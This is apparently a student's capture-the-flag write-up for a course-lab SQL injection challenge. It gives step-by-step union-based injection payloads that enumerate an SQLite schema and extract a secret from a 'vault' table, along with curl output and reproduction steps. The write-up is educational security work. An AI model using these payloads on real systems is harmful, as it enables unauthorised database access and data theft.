## On the page <http://sqli3.chal.deti:8032> i saw 8 buttons that redirect to photos

- They redirect to <http://sqli3.chal.deti:8032/photo/{number}>

## Method

- The first thing I tried was various numbers in the URL which led me to conclude that there weren't any aparent photos hidden, there were just 1-8.
  - Non existing photos return the message

  ```
  That photo could not be loaded.
  ```

- Then to try if an injection was possible i tried

```
http://sqli3.chat.deti:8032/photo/1 AND 1=0
```

- Which returned

```
That photo could not be loaded
```

- Then to really confirm

```
http://sqli3.chal.deti:8032/photo1 AND 1=1
```

Which loaded the photo normally

- This confirms that an injection is possible and it is to be done in the last subdir of the URL
- Then i tried to get UNION based information by doing

```
http://sqli3.chal.deti:8032/photo/1 UNION SELECT 1,2,3
```

Which returned no photo

- Then I tried with 4 arguments

```
http://sqli3.chal.deti:8032/photo/1 UNION SELECT 1,2,3,4
```

And it return 500 error

- This led to me conclude that it either had 3 collumns and they were the wrong type or that there were 4 collumns and they were the wrong type, to test this I went with 5 arguments

```
http://sqli3.chal.deti:8032/photo/1 0UNION SELECT 1,2,3,4,5
```

Which returned me no photo, this proved to me that there were 4 columns, because it is the one that behaves differently, i just need to find the types now

- Putting everything as a string(with "") worked but returned still the normal photo, I suspect that it is because the id 1 already has a photo thus the UNION returns 2 "photos" and the site just displays the first, so I will try with the ID 10 to check my hypotheses

```
http://sqli3.chal.deti:8032/photo/10 UNION SELECT "1","2","3","4"
```

- This returned a website with a photo, but the values on the site were the stuff I put on the URL, I see a 3, a 2 and a 4, the 1 isnt shown, as you can see from the difference between using the photo 1 and 10
Photo 10:

``` html
s24@s24:~$ curl -X GET 'http://sqli3.chal.deti:8032/photo/10%20UNION%20SELECT%20%221%22,%222%22,%223%22,%224%22'
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>PhotoVault</title>
  <link rel="stylesheet" href="/static/base.css">
</head>
<body>
  <div class="shell">
    <header class="masthead">
      
      <div class="logo" aria-hidden="true">P</div>
      
      <div>
        <h1>PhotoVault</h1>
        <p class="tagline">A little gallery of the places we&#39;ve been</p>
      </div>
    </header>

    

    
    <div class="card">
      
      <h2>3</h2>
      
      <div class="thumb thumb-large" aria-hidden="true">2</div>
      
      <p>4</p>
      <a class="btn-ghost" href="/">&larr; Back to the gallery</a>
      
    </div>
    

    <footer class="footer">&copy; 2026 PhotoVault &middot; prepared for the course lab</footer>
  </div>
</body>
</html>
```

Photo 1:

``` html
s24@s24:~$ curl -X GET 'http://sqli3.chal.deti:8032/photo/1%20UNION%20SELECT%20%221%22,%222%22,%223%22,%224%22'
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>PhotoVault</title>
  <link rel="stylesheet" href="/static/base.css">
</head>
<body>
  <div class="shell">
    <header class="masthead">
      
      <div class="logo" aria-hidden="true">P</div>
      
      <div>
        <h1>PhotoVault</h1>
        <p class="tagline">A little gallery of the places we&#39;ve been</p>
      </div>
    </header>

    

    
    <div class="card">
      
      <h2>Harbour at dawn</h2>
      
      <div class="thumb thumb-large" aria-hidden="true">h</div>
      
      <p>The fishing boats come in before the market opens.</p>
      <a class="btn-ghost" href="/">&larr; Back to the gallery</a>
      
    </div>
    

    <footer class="footer">&copy; 2026 PhotoVault &middot; prepared for the course lab</footer>
  </div>
</body>
</html>
```

- By using Then

```
http://sqli3.chal.deti:8032/photo/10 UNION SELECT "1","2","3","4" FROM sqlite_schema
```

And it returning the "photo" it shows that this is an sqlite DB

- Then i did

```
http://sqli3.chal.deti:8032/photo/10 UNION SELECT "1",type,name,"4" FROM sqlite_schema
```

Which returned me that type was "table" and name was "p"

- I tought that "p" is a strange name for a table and tought that maybe the 3rd argument shows only one char, so I tried

```
http://sqli3.chal.deti:8032/photo/10 UNION SELECT "1",name,name,"4" FROM sqlite_schema
```

- I was right, the table name is "photos"

- To get other tables from the DB (the site just lets me see one at a time) i did

```
http://sqli3.chal.deti:8032/photo/10 UNION SELECT "1",name,name,"4" FROM sqlite_schema WHERE name!='photos'
```

- By luck this returned the table vault which is interesting, now i want to get the columns names of this table by doing

```
http://sqli3.chal.deti:8032/photo/10 UNION SELECT "1",name,sql,"4" FROM sqlite_schema WHERE name='vault'
```

This gave me the sql used to create the table

```
CREATE TABLE vault (item TEXT, secret TEXT)
```

- To get the secret I did

```
http://sqli3.chal.deti:8032/photo/10 UNION SELECT "1",item,secret,"4" FROM vault
```

- This retuned the flag in the page

## Reproduce

- In the URL put

```
http://sqli3.chal.deti:8032/photo/10 UNION SELECT "1",name,name,"4" FROM sqlite_schema WHERE name!='photos'
```

To get the vault table

- Then to get their columns by the sql used to create it put

```
http://sqli3.chal.deti:8032/photo/10 UNION SELECT "1",name,sql,"4" FROM sqlite_schema WHERE name='vault'
```

- Then to get the secret put

```
http://sqli3.chal.deti:8032/photo/10 UNION SELECT "1",item,secret,"4" FROM vault
```
